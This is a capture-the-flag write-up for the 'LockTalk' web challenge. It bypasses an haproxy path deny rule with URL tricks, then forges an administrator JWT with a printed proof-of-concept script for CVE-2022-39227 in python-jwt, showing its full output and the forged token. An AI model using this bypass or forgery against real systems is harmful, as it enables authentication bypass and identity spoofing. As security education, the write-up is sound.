# Cyber Apocalypse 2024

## LockTalk

> In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.
> 
> Author: dhmosfunk
> 
> [`web_locktalk.zip`](web_locktalk.zip)

Tags: _web_

## Solution
For this challenge we get a webapp that offers three endpoints.

```bash
/api/v1/get_ticket
-> Generates a ticket (JWT token)

/api/v1/chat/{chatId}
-> Find chat history by ID

/api/v1/flag
-> Retrieves the flag
```

Lets inspect the source code for this. The chat history turns out to be completely unnecessary. So we concentrate on the other two endpoints. To get the flag we need to be authorized as `administrator`, therefore we need a `JWT` with the correct claim.

```python
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```

The endpoint `/api/v1/get_ticket` is not restricted, but when we want to trigger it we get `Forbidden: Request forbidden by administrative rules.`.

```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():

    claims = {
        "role": "guest",
        "user": "guest_user"
    }

    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket: ': token})
```

As it turns out a `haproxy` is configured and blocks this route. 

```bash
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

This can be bypassed easily by adding an extra `/` to the beginning of the route or adding `%0` to the end. Calling it like this gives us a ticket.

```json
{"ticket: ":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.GtbxJXolesU85D0Y3BnMU869VqB-2fqf9KGBXPBKggUU-7NopcFdfYtMLLW96zwpeqi_-uOkZeVDFNjNr513W8SbqAtf5dkkLO53ovUWgu3DhfkEy2HMZw-hhULkxGK4nq2HR6Rpf7HWBlxOaNwc0PBLgEbcOktGZBkKx0pbRdH_V7OjGAUwQkkETHY8Ro5mjFCtqdAIlgDTy-SRM8PPwLXdRCP1L20VNvoljeTsFFjbQvrsV8-DuzXcc8FDt6YeVfNDwmjiXJqPapjy068fDNxDdBFXIAqTHjiLAAcjbeuioIAPkesEsoySf2bf1jCqHSetH1jE7PXBgErdIzxvWQ"}
```

Using [`JWT Debugger`](https://jwt.io/) we can see the token uses `PS256` to sign the token and is for `guest_user` in `guest` role.

```json
{
  "alg": "PS256",
  "typ": "JWT"
}

{
  "exp": 1710547893,
  "iat": 1710544293,
  "jti": "WYCG_OVm2dvE5XldeXz1-Q",
  "nbf": 1710544293,
  "role": "guest",
  "user": "guest_user"
}
```

The function `authorize_roles` uses `jwt.verify_jwt` to verify the token and specifies the signing algorithm. We can see the `JWT_SECRET_KEY` is created with `JWT_SECRET_KEY = jwk.JWK.generate(kty='RSA', size=2048)` (config.py), so we dont bother cracking the secret.

```python
def authorize_roles(roles):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            token = request.headers.get('Authorization')

            if not token:
                return jsonify({'message': 'JWT token is missing or invalid.'}), 401

            try:
                token = jwt.verify_jwt(token, current_app.config.get('JWT_SECRET_KEY'), ['PS256'])
                user_role = token[1]['role']

                if user_role not in roles:
                    return jsonify({'message': f'{user_role} user does not have the required authorization to access the resource.'}), 403

                return func(*args, **kwargs)
            except Exception as e:
                return jsonify({'message': 'JWT token verification failed.', 'error': str(e)}), 401
        return wrapper
    return decorator
```

Checking out `requirements.txt` we see that `python_jwt==3.3.3` is used. After some research we can find [`CVE-2022-39227`](https://nvd.nist.gov/vuln/detail/CVE-2022-39227) which claims:

> python-jwt is a module for generating and verifying JSON Web Tokens. Versions prior to 3.3.4 are subject to Authentication Bypass by Spoofing, resulting in identity spoofing, session hijacking or authentication bypass. An attacker who obtains a JWT can arbitrarily forge its contents without knowing the secret key. Depending on the application, this may for example enable the attacker to spoof other user's identities, hijack their sessions, or bypass authentication. Users should upgrade to version 3.3.4. There are no known workarounds.

We also find a [Proof of Concept](https://github.com/user0x1337/CVE-2022-39227).

```python
#!/usr/bin/env python3
# Proof of concept for the CVE-2022-39227. According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with moified claims.
#
# Application: python-jwt
# Infected version: < 3.3.4
# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227
#
# Dependencies: jwcrypto, json, argparse
# Author: user0x1337
# Github: https://github.com/user0x1337
#
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse

parser = argparse.ArgumentParser(prog='CVE-2022-39227-PoC', description='Proof of Concept for the JWT verification bug in python-jwt version < 3.3.4')
parser.add_argument('-j', '--jwt_token', required=True, dest='token', help='Original and valid JWT Token returned by the application')
parser.add_argument('-i', '--injected_claim', required=True, dest='claim', help='Inject claim using the form "key=value", e.g. "username=admin". Use "," for more claims (e.g. username=admin,id=3)')
args = parser.parse_args()

# Split JWT in its ingredients
[header, payload, signature] = args.token.split(".")
print(f"[+] Retrieved base64 encoded payload: {payload}")

# Payload is relevant
parsed_payload = loads(base64url_decode(payload))
print(f"[+] Decoded payload: {parsed_payload}")

# Processing of the user input and inject new claims
try:
    claims = args.claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

# merging. Generate a new payload
print(f'[+] Inject new "fake" payload: {parsed_payload}')
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
print(f'[+] Fake payload encoded: {fake_payload}\n')

# Create a new JWT Web Token
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] New token:\n {new_payload}\n')
print(f'Example (HTTP-Cookie):\n------------------------------\nauth={new_payload}')
```

Having all in place, we can now forge a token that gives us a admin role:

```bash
$ python poc.py --jwt_token eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.GtbxJXolesU85D0Y3BnMU869VqB-2fqf9KGBXPBKggUU-7NopcFdfYtMLLW96zwpeqi_-uOkZeVDFNjNr513W8SbqAtf5dkkLO53ovUWgu3DhfkEy2HMZw-hhULkxGK4nq2HR6Rpf7HWBlxOaNwc0PBLgEbcOktGZBkKx0pbRdH_V7OjGAUwQkkETHY8Ro5mjFCtqdAIlgDTy-SRM8PPwLXdRCP1L20VNvoljeTsFFjbQvrsV8-DuzXcc8FDt6YeVfNDwmjiXJqPapjy068fDNxDdBFXIAqTHjiLAAcjbeuioIAPkesEsoySf2bf1jCqHSetH1jE7PXBgErdIzxvWQ -i role=administrator
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710547893, 'iat': 1710544293, 'jti': 'WYCG_OVm2dvE5XldeXz1-Q', 'nbf': 1710544293, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710547893, 'iat': 1710544293, 'jti': 'WYCG_OVm2dvE5XldeXz1-Q', 'nbf': 1710544293, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"GtbxJXolesU85D0Y3BnMU869VqB-2fqf9KGBXPBKggUU-7NopcFdfYtMLLW96zwpeqi_-uOkZeVDFNjNr513W8SbqAtf5dkkLO53ovUWgu3DhfkEy2HMZw-hhULkxGK4nq2HR6Rpf7HWBlxOaNwc0PBLgEbcOktGZBkKx0pbRdH_V7OjGAUwQkkETHY8Ro5mjFCtqdAIlgDTy-SRM8PPwLXdRCP1L20VNvoljeTsFFjbQvrsV8-DuzXcc8FDt6YeVfNDwmjiXJqPapjy068fDNxDdBFXIAqTHjiLAAcjbeuioIAPkesEsoySf2bf1jCqHSetH1jE7PXBgErdIzxvWQ"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTA1NDc4OTMsImlhdCI6MTcxMDU0NDI5MywianRpIjoiV1lDR19PVm0yZHZFNVhsZGVYejEtUSIsIm5iZiI6MTcxMDU0NDI5Mywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"GtbxJXolesU85D0Y3BnMU869VqB-2fqf9KGBXPBKggUU-7NopcFdfYtMLLW96zwpeqi_-uOkZeVDFNjNr513W8SbqAtf5dkkLO53ovUWgu3DhfkEy2HMZw-hhULkxGK4nq2HR6Rpf7HWBlxOaNwc0PBLgEbcOktGZBkKx0pbRdH_V7OjGAUwQkkETHY8Ro5mjFCtqdAIlgDTy-SRM8PPwLXdRCP1L20VNvoljeTsFFjbQvrsV8-DuzXcc8FDt6YeVfNDwmjiXJqPapjy068fDNxDdBFXIAqTHjiLAAcjbeuioIAPkesEsoySf2bf1jCqHSetH1jE7PXBgErdIzxvWQ"}
```

Using the endpoint `/api/v1/flag` with this token gives us the flag.

Flag `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`